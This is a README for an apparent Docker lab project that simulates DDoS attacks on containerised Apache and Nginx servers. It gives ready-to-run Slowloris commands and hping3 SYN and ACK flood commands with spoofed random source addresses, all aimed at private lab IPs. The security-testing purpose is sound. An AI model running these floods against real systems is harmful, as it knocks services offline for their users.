# DDoS Attack Simulation Tool

This project provides a set of tools to simulate DDoS attacks against Apache and Nginx servers for testing and security evaluation purposes.

## Prerequisites

- Docker and Docker Compose must be installed on your machine.

## Usage

1. Build and run the containers

```bash
docker-compose -f stack.yml up -d --build

# build images and run containers

```bash
docker-compose -f stack.yml up -d --build
```

2. HTTP Flood Attacks

- Slowloris attack against the Apache server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.2 -s 1000"
```

- Slowloris attack against the Nginx server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.3 -s 1000"
```

3. SYN Flood Attacks

- SYN Flood attack against the Apache server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
```

- SYN Flood attack against the Nginx server
```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
```

4. ACK Flood Attacks

- ACK Flood attack against the Apache server
```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
```

- ACK Flood attack against the Nginx server
```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
```

5. Stop the containers
```bash
docker-compose -f stack.yml down
```

## Disclaimer

This project is for educational purposes only. Do not use it for illegal purposes. The authors of this project are not responsible for any misuse of the information provided.

## Authors
Ahmat Mahamat Ahmat
Elaggoun Aref
Fouché Stanislas
Memar Ahmed

## Licence

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```


 
